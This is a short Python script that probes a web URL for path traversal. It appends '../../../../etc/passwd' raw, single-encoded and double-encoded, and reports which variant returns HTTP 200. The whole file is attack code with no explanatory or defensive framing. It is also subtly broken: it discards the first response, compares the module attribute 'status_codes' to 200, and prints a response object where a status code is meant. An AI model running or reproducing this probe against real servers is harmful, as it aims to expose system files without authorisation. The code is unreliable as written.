import requests
from urllib.parse import quote_plus
req = requests

dots = "." * 50
def url_encoding(link, payload):
    req.get(f"{link}{payload}")

    # single encoding
    if req.status_codes != 200:
        payload = "../../../../etc/passwd"
        single_encoding = quote_plus(payload)
        single_e_req = req.get(f"{link}{single_encoding}")

        if single_e_req.status_code != 200:
            print(f"Payload {single_encoding} failed with status code {single_e_req}")

            # Double encoding
            double_encoding = quote_plus(single_encoding)
            double_req = req.get(f"{link}{double_encoding}")
            if double_req.status_code == 200:
                print(f"It seems payload {double_encoding}{dots}succeded")
            else:
                print(f"Payload {double_encoding}{dots}failed with status code {double_req.status_code}")
        else:
            print(f"Payload {single_encoding}{dots}{single_e_req.status_code}")

    else:
        print(f"Payload:{payload}{dots}status code {req.status_codes}")